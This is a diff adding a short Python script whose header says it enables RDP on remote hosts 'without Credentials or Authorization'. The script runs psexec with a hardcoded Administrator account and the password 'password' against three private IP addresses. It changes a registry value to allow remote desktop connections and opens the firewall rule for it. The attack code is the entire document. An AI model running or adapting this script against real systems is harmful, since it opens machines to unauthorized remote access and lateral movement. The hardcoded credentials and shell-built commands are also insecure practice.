@@ -1,0 +1,18 @@
+# Allow RDP Connections on Remote Hosts without Credentials or Authorization
+
+import os
+import subprocess
+
+def enable_rdp(host):
+    try:
+        # Enable RDP on the remote host
+        subprocess.run(f'psexec \\\\{host} -u Administrator -p password reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f', shell=True)
+        subprocess.run(f'psexec \\\\{host} -u Administrator -p password netsh advfirewall firewall set rule group="remote desktop" new enable=yes', shell=True)
+        print(f"RDP enabled on {host}")
+    except Exception as e:
+        print(f"Failed to enable RDP on {host}: {e}")
+
+hosts = ["192.168.1.10", "192.168.1.11", "192.168.1.12"]
+
+for host in hosts:
+    enable_rdp(host)
